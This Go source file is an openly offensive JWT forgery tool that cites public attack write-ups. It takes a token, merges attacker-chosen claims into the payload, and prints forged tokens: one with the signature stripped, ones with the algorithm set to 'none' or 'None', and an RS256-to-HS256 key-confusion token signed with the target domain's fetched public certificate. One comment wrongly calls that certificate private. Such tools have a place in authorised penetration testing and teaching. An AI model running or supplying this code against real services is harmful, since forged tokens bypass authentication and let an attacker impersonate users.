/*
* Sources:
* - https://www.nccgroup.com/uk/about-us/newsroom-and-events/blogs/2019/january/jwt-attack-walk-through/
* - https://medium.com/101-writeups/hacking-json-web-token-jwt-233fe6c862e6
 */

package main

import (
	"bytes"
	"encoding/base64"
	"encoding/hex"
	"encoding/json"
	"flag"
	"fmt"
	"log"
	"os"
	"os/exec"
	"strings"
)

type Header struct {
	Typ string `json:"typ"`
	Alg string `json:"alg"`
}

func main() {

	var domain, jsonStr, jwt string
	flag.StringVar(&jwt, "t", "", "JWT Token to modify")
	flag.StringVar(&domain, "d", "", "Domain to use the SSL public key for RS")
	flag.StringVar(&jsonStr, "j", "{}", "json to merge with orginal payload")

	flag.Parse()

	fmt.Printf("\n\nAnalyzing                              %s\n\n", jwt)

	jwtArr := strings.Split(jwt, ".")
	encHeader := jwtArr[0]
	strHeader := b64Decode(encHeader)

	encPayload := jwtArr[1]
	payload := b64Decode(encPayload)
	fmt.Printf("Header                                 %s\n\n", strHeader)
	fmt.Printf("Current Payload                        %s\n\n", payload)

	// Calculate new payload if any.
	newPayload := getNewPayload(payload, jsonStr)

	fmt.Printf("New Payload                            %s\n\n", newPayload)

	// Forward new b64encoded payload.
	encNewPayload := b64Encode([]byte(newPayload))
	jwtWithoutSignature(encHeader, encNewPayload)

	jwtWithoutSignatureAndNewAlg(strHeader, encNewPayload, "none")
	jwtWithoutSignatureAndNewAlg(strHeader, encNewPayload, "None")

	RS256ToHS256(encHeader, encNewPayload, domain)
}

func b64Decode(str string) string {
	sDec, err := base64.StdEncoding.DecodeString(str)

	if err != nil {
		log.Fatal("error decoding: ", str, " :", err)
	}

	return string(sDec)
}

func b64Encode(b []byte) string {
	return base64.StdEncoding.EncodeToString(b)
}

func jwtWithoutSignature(encHeader string, encPayload string) {
	fmt.Printf("JWT without signature:                 %s.%s.\n\n", encHeader, encPayload)
}

func jwtWithoutSignatureAndNewAlg(strHeader string, encPayload string, alg string) {
	var header Header
	json.Unmarshal([]byte(strHeader), &header)
	header.Alg = alg

	newHeader, _ := json.Marshal(header)
	fmt.Printf("JWT without signature, ALG:%s:       %s.%s.\n\n", alg, b64Encode(newHeader), encPayload)
}

func RS256ToHS256(encHeader string, encPayload string, domain string) {
	strHeader := b64Decode(encHeader)
	var header Header
	json.Unmarshal([]byte(strHeader), &header)

	// If Alg is not RS256, return.
	if header.Alg != "RS256" {
		return
	}

	// Otherwise, if domain not provided, return.
	if domain == "" {
		return
	}

	// Otherwise, get certificate.

	// Write Certifcate to jwt.${domain}.cert.(pem|pub)
	certKeyFile := "jwt." + domain + ".cert.pem"

	// Delete if exists.
	os.Remove(certKeyFile)

	// Download Private certificate from domain: jwt.${domain}.cert.pem
	certKey := getCertKey(domain)
	writeFile(certKeyFile, certKey)

	// Generate Public certificate associated jwt.${domain}.cert.pub
	pubKey := getPublicCert(certKeyFile)

	// Encode Public Key as HexaDecimal.
	pubKeyHexa := hex.EncodeToString([]byte(pubKey))

	// Calculate new signature.
	signature := getHS256Signature(encHeader, encPayload, pubKeyHexa)

	// Recompute new Header with HS256
	header.Alg = "HS256"
	newHeader, _ := json.Marshal(header)
	fmt.Printf("JWT RS256 to HS256:                    %s.%s.%s\n\n", b64Encode(newHeader), encPayload, signature)
	fmt.Printf("JWT RS256 to HS256 (B64):              %s.%s.%s\n\n", b64Encode(newHeader), encPayload, b64Encode([]byte(signature)))

	// Remove certificate file..
	os.Remove(certKeyFile)
}

func getCertKey(domain string) string {
	cmd := exec.Command("openssl", "s_client", "-showcerts", "-connect", domain+":443")
	cmdOutput := &bytes.Buffer{}
	cmd.Stdout = cmdOutput
	cmd.Run()
	bCert := string(cmdOutput.Bytes())
	return buildCert(bCert, "-----BEGIN CERTIFICATE-----", "-----END CERTIFICATE-----")
}

// openssl x509 -in cert.pem -pubkey
func getPublicCert(certKeyFile string) string {
	cmd := exec.Command("openssl", "x509", "-in", certKeyFile, "-pubkey")
	cmdOutput := &bytes.Buffer{}
	cmd.Stdout = cmdOutput
	cmd.Run()
	bCert := string(cmdOutput.Bytes())
	return buildCert(bCert, "-----BEGIN PUBLIC KEY-----", "-----END PUBLIC KEY-----")
}

// echo -n "eyJ0I1NiJ9.eyJpifX0" | openssl dgst -sha256 -mac HMAC -macopt hexkey:2d2d2d36467d2d2d0a
func getHS256Signature(encHeader string, encPayload string, pubKeyHexa string) string {
	openssl := exec.Command("openssl", "dgst", "-sha256", "-mac", "HMAC", "-macopt", "hexkey:"+pubKeyHexa)

	openssl.Stdin = bytes.NewReader([]byte(encHeader + "." + encPayload))

	cmdOutput := &bytes.Buffer{}
	openssl.Stdout = cmdOutput
	openssl.Start()
	openssl.Wait()
	hmac := string(cmdOutput.Bytes())
	return hex.EncodeToString([]byte(hmac))
}

func strToInterface(str string) interface{} {
	b := []byte(str)
	var f interface{}
	err := json.Unmarshal(b, &f)

	if err != nil {
		log.Fatal("error in json:", str, err)
	}
	return f
}

func buildCert(bCert string, begining string, end string) string {
	tmp := strings.Split(bCert, begining)
	return begining + strings.Split(tmp[1], end)[0] + end
}

func writeFile(filename string, content string) {
	// If the file doesn't exist, create it, or append to the file
	f, err := os.OpenFile(filename, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		log.Fatal(err)
	}

	_, err = f.Write([]byte(content))
	if err != nil {
		log.Fatal(err)
	}

	f.Close()
}

func getNewPayload(payload string, jsonStr string) string {
	var mp1, mp2 map[string]interface{}
	// currentPayload := strToInterface(payload)

	_ = json.Unmarshal([]byte(payload), &mp1)
	_ = json.Unmarshal([]byte(jsonStr), &mp2)
	v := []map[string]interface{}{
		mp1,
		mp2,
	}

	m := mergeMaps(v...)
	b, _ := json.Marshal(&m)

	return string(b)
}

// overwriting duplicate keys, you should handle that if there is a need
func mergeMaps(maps ...map[string]interface{}) map[string]interface{} {
	result := make(map[string]interface{})
	for _, m := range maps {
		for k, v := range m {
			result[k] = v
		}
	}
	return result
}
